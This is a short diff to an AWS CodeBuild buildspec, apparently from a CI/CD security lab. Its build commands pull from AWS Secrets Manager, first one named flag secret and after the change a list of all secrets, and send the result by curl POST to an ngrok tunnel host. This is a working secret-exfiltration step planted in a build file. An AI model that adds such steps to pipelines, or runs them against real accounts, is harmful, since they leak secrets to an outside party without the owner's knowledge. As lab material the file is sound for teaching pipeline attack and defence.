@@ -3,5 +3,5 @@ phases:
   build:
     commands:
       - echo "Retrieving flag..."
-      - FLAG=$(aws secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:us-east-1:548772341820:secret:flag_codebuild_lab_5-HpFvxv)
+      - FLAG=$(aws secretsmanager list-secrets)
       - curl -X POST https://sabbath-tidy-sublet.ngrok-free.dev --data "flag=$FLAG"
